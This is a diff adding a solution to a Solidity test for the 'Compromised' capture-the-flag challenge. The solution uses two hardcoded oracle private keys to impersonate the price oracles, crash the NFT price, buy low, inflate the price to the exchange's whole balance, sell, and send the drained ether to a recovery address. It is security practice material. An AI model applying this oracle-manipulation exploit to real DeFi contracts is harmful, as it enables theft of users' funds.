@@ -71,11 +71,76 @@ contract CompromisedChallenge is Test {
         assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
     }
 
+    // uint256 rep of the private keys
+    uint256 private constant PRIVATE_KEY_1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+    uint256 private constant PRIVATE_KEY_2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+    function setMedianPrice(uint256 amount) internal {
+        // Get oracle addresses from private keys
+        address oracle1 = vm.addr(PRIVATE_KEY_1);
+        address oracle2 = vm.addr(PRIVATE_KEY_2);
+        
+        console.log("Oracle 1 address:", oracle1);
+        console.log("Oracle 2 address:", oracle2);
+
+        // Before
+        uint256 currMedianPrice = oracle.getMedianPrice("DVNFT");
+        console.log("Current median price is", currMedianPrice);
+
+        // Post from oracle1
+        console.log("Posting to oracle 1");
+        vm.prank(oracle1);
+        oracle.postPrice("DVNFT", amount);
+
+        // After 1 oracle
+        currMedianPrice = oracle.getMedianPrice("DVNFT");
+        console.log("Current median price is", currMedianPrice);
+
+        // Post from oracle2
+        console.log("Posting to oracle 2");
+        vm.prank(oracle2);
+        oracle.postPrice("DVNFT", amount);
+
+        // After 2 oracle
+        currMedianPrice = oracle.getMedianPrice("DVNFT");
+        console.log("Current median price is", currMedianPrice);
+    }
+
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+           /** CODE YOUR EXPLOIT HERE */
+     // Set price to 0.01 ether
+        uint256 priceToSet = 0.01 ether;
+        setMedianPrice(priceToSet);
+
+        // Buy NFT as player
+        vm.prank(player);
+        exchange.buyOne{value: priceToSet}();
+
+        // Verify ownership
+        uint256 tokenId = 0;
+        assertEq(nft.ownerOf(tokenId), player);
+        console.log("Successfully purchased NFT");
+
+        // Set price to exchange balance
+        console.log("Setting price to balance of exchange");
+        uint256 balOfExchange = address(exchange).balance;
+        setMedianPrice(balOfExchange);
+
+        // Sell NFT
+        console.log("Selling NFT for the median price");
+        vm.prank(player);
+        nft.approve(address(exchange), tokenId);
+        vm.prank(player);
+        exchange.sellOne(tokenId);
         
+        // Reset oracle price
+        setMedianPrice(INITIAL_NFT_PRICE);
+
+        //send funds to recovery
+        vm.prank(player);
+        (bool success,) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
     }
 
     /**
